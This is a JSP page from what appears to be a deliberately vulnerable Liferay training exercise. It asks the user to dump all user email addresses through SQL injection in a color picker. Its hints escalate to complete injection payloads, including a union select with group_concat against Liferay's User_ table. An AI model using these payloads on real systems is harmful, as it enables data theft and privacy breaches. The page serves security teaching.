<%@ page import="com.liferay.portal.kernel.util.ParamUtil" %>
<%@ page import="com.liferay.portal.kernel.util.HtmlUtil" %>

<%@ include file="/init.jsp" %>

<%
StringBuilder log = (StringBuilder)request.getAttribute("log");
StringBuilder sql = (StringBuilder)request.getAttribute("sql");
%>

<c:forEach items="${colorNames}" var="colorName">
	<portlet:renderURL var="showColorURL">
		<portlet:param name="colorName" value="${colorName}"></portlet:param>
	</portlet:renderURL>
	
	<a href="${showColorURL}">choose ${colorName}</a><br>
</c:forEach>                        

<p style="background-color: #<%= userColorCode %>;">Your chosen color is: <%= userColorName %></p>

<p>Your task is to display the email address for all users in Liferay's database.</p>

<liferay-ui:panel-container>
	<liferay-ui:panel collapsible="true" state="closed" title="log - use this only as a last resort!">
		<p>Here you can see the database exception. Because you probably never can do it in real life, try
		to not use this feature.</p>
<pre>
<%= HtmlUtil.escape(log.toString()) %>
</pre>
	</liferay-ui:panel>
	<liferay-ui:panel collapsible="true" state="closed" title="sql - big cheat!">
		<p>Here you can see the sql command. Because you probably never, ever can do this in real life, try
		to not use this feature.</p>
<pre>
<%= HtmlUtil.escape(sql.toString()) %>
</pre>
	</liferay-ui:panel>
</liferay-ui:panel-container>


<liferay-ui:panel-container>
	<liferay-ui:panel collapsible="true" state="closed" title="hint 0.a">
		<p>Where is the output of the sql select in the html?</p>
	</liferay-ui:panel>
	<liferay-ui:panel collapsible="true" state="closed" title="hint 0.b">
		<p>This is in the style of the p-tag where the background is changing as you select different colors.</p>
	</liferay-ui:panel>
	<liferay-ui:panel collapsible="true" state="closed" title="hint 1">
		<p>Write down the most simple select, which can find the color code for the input name! Let's assume,
		that my table is the most simple, it stores only the name and code for colors as strings.</p>
	</liferay-ui:panel>
	<liferay-ui:panel collapsible="true" state="closed" title="hint 2">
		<p>Something like this: select .... where colorname = 'user input'</p>
		<p>Try to put a value which is not in the database and close the expression with "'".</p>
		<p>Think also that the coder used an apostrophe at the end of the sql, so you have to utilize that
		apostrophe to avoid sql syntax error.</p>
	</liferay-ui:panel>
	
	<liferay-ui:panel collapsible="true" state="closed" title="hint 3">
		<p><b>blueX' and ''='</b> is good enough, it first closes the input, than at the end it leaves an apostrophe
		because the coder's sql will put one there.</p>
	</liferay-ui:panel>
	<liferay-ui:panel collapsible="true" state="closed" title="hint 4">
		<p>Liferay stores user in the User_ table. Try to select everything from it!</p>
	</liferay-ui:panel>
	<liferay-ui:panel collapsible="true" state="closed" title="hint 5">
		<p>union select ?</p>
	</liferay-ui:panel>
	<liferay-ui:panel collapsible="true" state="closed" title="hint 6">
		<p><b>blueX' union select * from User_ where ''='</b> is nearly good, however, the second select gives too many columns.
		emailAddress is our column. By the way, this info is publicly available, as Liferay is open source.
	</liferay-ui:panel>
		<liferay-ui:panel collapsible="true" state="closed" title="hint 7">
		<p><b>blueX' union select emailAddress from User_ where ''='</b> works! But, we need the email adresses of
		<b>all</b> users, not only one. What if you can concat the rows somehow?</p>
	</liferay-ui:panel>
	<liferay-ui:panel collapsible="true" state="closed" title="hint 8.a">
		<p>Try group_select !</p>
	</liferay-ui:panel>
	<liferay-ui:panel collapsible="true" state="closed" title="hint 8.b">
		<p>But for grouping you need a grouping column. But if there is more than one group (so more than one value
		in the grouping column) you will not able to concatenate every row into one. So you need a grouping column
		with only one value.</p>
	</liferay-ui:panel>
	<liferay-ui:panel collapsible="true" state="closed" title="hint 8.c">
		<b>select m.id, group_concat(m.EmailAddress) as emails from (select 1 as id, emailAddress from User_) as m group by m.id</b>
		<p>It gives you two columns, but you only need one and the closing trick is missing...
	</liferay-ui:panel>
	<liferay-ui:panel collapsible="true" state="closed" title="hint 9">
		<p>blueX' union select emails from (select m.id, group_concat(m.EmailAddress) as emails from (select 1 as id, emailAddress from User_) as m group by m.id) as mails where ''='</p>
	</liferay-ui:panel>
</liferay-ui:panel-container>
